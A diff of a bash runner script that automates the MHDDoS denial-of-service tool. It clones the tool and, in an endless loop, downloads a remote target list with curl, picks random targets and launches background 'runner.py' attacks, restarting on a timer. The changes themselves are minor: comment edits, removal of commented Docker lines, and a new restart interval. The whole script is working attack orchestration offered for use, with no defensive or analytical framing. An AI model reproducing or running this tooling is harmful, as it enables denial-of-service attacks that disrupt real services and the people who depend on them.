@@ -11,10 +11,6 @@ taskkill -f -im python3.8.exe
 taskkill -f -im python3.9.exe
 taskkill -f -im python3.10.exe
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
-# for Docker
-#echo "Kill all useless docker-containers with MHDDoS"
-#docker kill $(docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-#echo "Docker useless containers killed"
 
 num_of_copies="${1:-1}"
 if (("$num_of_copies" == "all"));
@@ -71,7 +67,7 @@ cd ~
 git clone https://github.com/alexnest-ua/runner_for_windows.git
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 
-# Restart attacks and update targets list every 10 minutes (by default)
+# Restart attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
 	cd ~/mhddos_proxy
@@ -113,7 +109,6 @@ do
 	#
    	sleep 3s
 	
-   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
 	
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
@@ -149,7 +144,7 @@ do
    	for i in $random_numbers
    	do
             echo -e "\n I = $i"
-            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
+            # Filter and only get lines that not start with "#". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
 
@@ -157,7 +152,6 @@ do
             echo "python runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
             cd ~/mhddos_proxy
-            #docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $rpc
             python runner.py $cmd_line --rpc $rpc -t $threads $debug&
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
@@ -178,8 +172,4 @@ do
 	sleep $no_ddos_sleep
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
 	
-	# for docker
-   	#echo "Kill all useless docker-containers with MHDDoS"
-   	#docker kill $(docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-   	#echo "Docker useless containers killed"
 done
